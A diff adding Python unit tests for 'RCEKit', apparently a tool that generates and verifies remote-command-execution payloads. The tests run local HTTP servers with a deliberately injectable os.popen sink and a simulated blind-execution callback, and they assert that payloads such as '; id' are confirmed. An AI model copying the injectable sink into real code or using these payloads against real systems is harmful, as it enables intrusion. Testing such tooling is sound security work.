@@ -1360,5 +1360,110 @@ class EncodedOracleTestCase(unittest.TestCase):
         self.assertFalse(self.gen._encoded_search(r"uid=\d+", "welcome — 49 documents processed"))
 
 
+class VerifyChainTestCase(unittest.TestCase):
+    """O2: the session-aware multi-step chain runner reaches sinks a single
+    stateless request cannot — confirming in-band (match oracle) and out-of-band
+    (a {callback} URL received by the built-in listener)."""
+
+    def setUp(self):
+        self.gen = RCEKit()
+
+    @staticmethod
+    def _free_port():
+        import socket
+        s = socket.socket()
+        s.bind(("127.0.0.1", 0))
+        port = s.getsockname()[1]
+        s.close()
+        return port
+
+    def test_chain_confirms_in_band_via_multi_step_flow(self):
+        import http.server, socketserver, threading, re as _re, urllib.parse as up
+
+        class Handler(http.server.BaseHTTPRequestHandler):
+            def log_message(self, *a):
+                pass
+
+            def do_GET(self):  # token page whose value a later step must reuse
+                self.send_response(200); self.end_headers()
+                self.wfile.write(b"session TOKEN=abc123 ready")
+
+            def do_POST(self):
+                length = int(self.headers.get("Content-Length", 0))
+                body = self.rfile.read(length).decode()
+                cmd = up.parse_qs(body).get("cmd", [""])[0]
+                pipe = os.popen("echo " + cmd + " 2>&1")  # command injection sink
+                out = pipe.read(); pipe.close()
+                self.send_response(200); self.end_headers()
+                try:
+                    self.wfile.write(out.encode(errors="replace"))
+                except BrokenPipeError:
+                    pass
+
+        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
+        port = server.server_address[1]
+        threading.Thread(target=server.serve_forever, daemon=True).start()
+        try:
+            chain = {
+                "base": f"http://127.0.0.1:{port}",
+                "confirm_step": "run",
+                "steps": [
+                    {"name": "tok", "method": "GET", "path": "/session",
+                     "extract": {"tok": r"TOKEN=(\w+)"}},
+                    {"name": "run", "method": "POST", "path": "/run",
+                     "form": {"session": "{tok}", "cmd": "FUZZ"}},
+                ],
+            }
+            records = list(self.gen.generate_payload_records(
+                selected_categories=["basic_enum"], selected_environments=["unix"],
+                selected_contexts=["raw"], selected_encodings=["none"]))
+            results = self.gen.run_verification_chain(records, chain)
+            confirmed = [r for r in results if r["verdict"] == "confirmed"]
+            self.assertTrue(confirmed, "the chain must confirm at least one RCE")
+            self.assertTrue(any(r["payload"] == "; id" for r in confirmed))
+        finally:
+            server.shutdown(); server.server_close()
+
+    def test_chain_confirms_out_of_band_via_builtin_listener(self):
+        import http.server, socketserver, threading, re as _re, urllib.request
+
+        class Handler(http.server.BaseHTTPRequestHandler):
+            def log_message(self, *a):
+                pass
+
+            def do_POST(self):
+                length = int(self.headers.get("Content-Length", 0))
+                body = self.rfile.read(length).decode()
+                # Simulate blind execution: the "command" fetches the callback URL.
+                m = _re.search(r"https?://\S+", body)
+                if m:
+                    try:
+                        urllib.request.urlopen(m.group(0).strip("'\""), timeout=3).read()
+                    except Exception:
+                        pass
+                self.send_response(200); self.end_headers(); self.wfile.write(b"queued")
+
+        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
+        port = server.server_address[1]
+        threading.Thread(target=server.serve_forever, daemon=True).start()
+        listen_port = self._free_port()
+        try:
+            chain = {
+                "base": f"http://127.0.0.1:{port}",
+                "callback_host": "127.0.0.1",
+                "listen_port": listen_port,
+                "steps": [
+                    {"name": "exec", "method": "POST", "path": "/exec", "body": "cmd=FUZZ"},
+                ],
+            }
+            rec = make_record(payload="run {callback}", category="oob",
+                              expected_channel="response", match=None)
+            results = self.gen.run_verification_chain([rec], chain)
+            self.assertEqual(results[0]["verdict"], "confirmed")
+            self.assertIn("callback", results[0]["detail"])
+        finally:
+            server.shutdown(); server.server_close()
+
+
 if __name__ == "__main__":
     unittest.main()
